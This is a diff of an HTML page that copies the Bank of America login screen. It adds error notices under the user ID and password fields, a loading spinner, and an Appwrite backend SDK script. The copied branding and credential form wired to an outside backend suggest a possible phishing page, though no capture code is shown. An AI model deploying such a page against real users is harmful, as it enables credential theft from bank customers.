@@ -21,7 +21,9 @@
     class="min-h-screen flex flex-col font-arial text-gray-700 w-full w-login-md mx-auto"
   >
     <!-- Deposit Widget -->
-    <div class="bg-gray-100 flex flex-col lg:flex-row px-3 py-2 lg:space-x-2 items-center justify-center lg:p-1.5">
+    <div
+      class="bg-gray-100 flex flex-col lg:flex-row px-3 py-2 lg:space-x-2 items-center justify-center lg:p-1.5"
+    >
       <span class="italic text-sm text-gray-500"
         >Bank of America deposit products:
       </span>
@@ -45,7 +47,7 @@
           />
           <span class="text-lg lg:text-2xl text-gray-500">Log In</span>
         </div>
-        
+
         <div class="hidden lg:flex items-center space-x-1.5 text-xs">
           <span
             class="flex items-center justify-center gap-1 text-gray-600 font-verdana font-semibold"
@@ -83,6 +85,9 @@
             id="user-id"
             class="border border-gray-300 py-1 px-2 w-full mb-3 rounded-sm focus:ring-blue-500 focus:border-blue-500"
           />
+          <p id="user-id-notice" class="mt-1 text-red-600 text-sm hidden">
+            <span class="text-base font-semibold"></span>
+          </p>
 
           <div class="flex items-center mb-6 text-sm">
             <input
@@ -107,6 +112,9 @@
             id="password"
             class="border border-gray-300 py-1 px-2 w-full mb-3 rounded-sm focus:ring-blue-500 focus:border-blue-500"
           />
+          <p id="password-notice" class="mt-1 text-red-600 text-sm hidden">
+            <span class="text-base font-semibold"></span>
+          </p>
 
           <a
             href="#"
@@ -116,9 +124,12 @@
 
           <button
             id="login-btn"
-            class="text-xl lg:text-lg bg-blue-700 hover:bg-blue-800 w-9/12 mx-auto lg:mx-0 mt-3 lg:mt-0 cursor-pointer text-white font-bold py-3 lg:py-2 px-4 rounded-lg flex items-center justify-center gap-1"
+            class="text-xl lg:text-lg bg-blue-600 hover:bg-blue-800 w-9/12 mx-auto lg:mx-0 mt-3 lg:mt-0 cursor-pointer text-white font-bold py-3 lg:py-2 px-4 rounded-lg flex items-center justify-center gap-1.5"
           >
-            <span class="material-symbols-outlined" style="font-size: 21px">
+            <span id="login-btn-spinner" class="material-symbols-outlined animate-spin menu-hidden">
+              progress_activity
+            </span>
+            <span id="login-security-icon" class="material-symbols-outlined" style="font-size: 21px">
               lock
             </span>
             Log In
@@ -129,7 +140,9 @@
         <div
           class="bg-white p-2 lg:px-3 col-span-2 flex flex-col items-center text-center"
         >
-          <h2 class="text-3xl md:text-4xl lg:text-xl font-semibold mb-4 text-gray-700 lg:text-gray-600">
+          <h2
+            class="text-3xl md:text-4xl lg:text-xl font-semibold mb-4 text-gray-700 lg:text-gray-600"
+          >
             Stay connected with our app
           </h2>
           <div class="flex flex-col items-center lg:flex-row lg:justify-center">
@@ -139,7 +152,9 @@
               class="w-[275px] md:w-80 lg:w-44 h-auto mb-6"
             />
             <div>
-              <p class="text-2xl font-semibold lg:font-normal lg:text-lg mb-4 lg:mb-2 lg:w-44 -mt-3.5">
+              <p
+                class="text-2xl font-semibold lg:font-normal lg:text-lg mb-4 lg:mb-2 lg:w-44 -mt-3.5"
+              >
                 Secure, convenient banking anytime
               </p>
               <button
@@ -153,7 +168,11 @@
 
         <!-- Help Links -->
         <div class="bg-white p-2 flex flex-col justify-start">
-          <h2 class="text-xl lg:text-base font-bold lg:font-semibold text-gray-700 lg:text-gray-600">Login help</h2>
+          <h2
+            class="text-xl lg:text-base font-bold lg:font-semibold text-gray-700 lg:text-gray-600"
+          >
+            Login help
+          </h2>
           <hr class="text-gray-300 mb-4 mt-1.5" />
           <ul class="ml-1 space-y-4 mb-6 text-sm lg:text-xs">
             <li>
@@ -168,7 +187,11 @@
             </li>
           </ul>
 
-          <h2 class="text-xl lg:text-base font-bold lg:font-semibold text-gray-700 lg:text-gray-600">Not using Online Banking?</h2>
+          <h2
+            class="text-xl lg:text-base font-bold lg:font-semibold text-gray-700 lg:text-gray-600"
+          >
+            Not using Online Banking?
+          </h2>
           <hr class="text-gray-300 mb-4 mt-1.5" />
           <ul class="ml-1 space-y-4 mb-6 text-sm lg:text-xs">
             <li>
@@ -192,7 +215,9 @@
     </main>
 
     <!-- Footer -->
-    <footer class="bg-gray-100 py-6 lg:pb-12 px-4 lg:px-8 font-verdana text-sm lg:text-xs text-gray-700 lg:text-gray-600 mt-5 lg:mt-10 lg:mb-6">
+    <footer
+      class="bg-gray-100 py-6 lg:pb-12 px-4 lg:px-8 font-verdana text-sm lg:text-xs text-gray-700 lg:text-gray-600 mt-5 lg:mt-10 lg:mb-6"
+    >
       <div
         class="max-w-7xl mx-auto flex flex-col items-start justify-between text-center lg:text-left gap-y-1.5"
       >
@@ -231,13 +256,22 @@
             <a href="#" class="text-blue-600 hover:underline"
               >Equal Housing Lender</a
             >
-            <span class="material-symbols-outlined" style="font-size: medium; font-weight: 600"> other_houses </span>
+            <span
+              class="material-symbols-outlined"
+              style="font-size: medium; font-weight: 600"
+            >
+              other_houses
+            </span>
           </p>
           <p class="mt-4">&copy; 2025 Bank of America Corporation.</p>
         </div>
       </div>
     </footer>
 
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/appwrite@17.0.0"
+    ></script>
     <script src="js/index.js"></script>
   </body>
 </html>
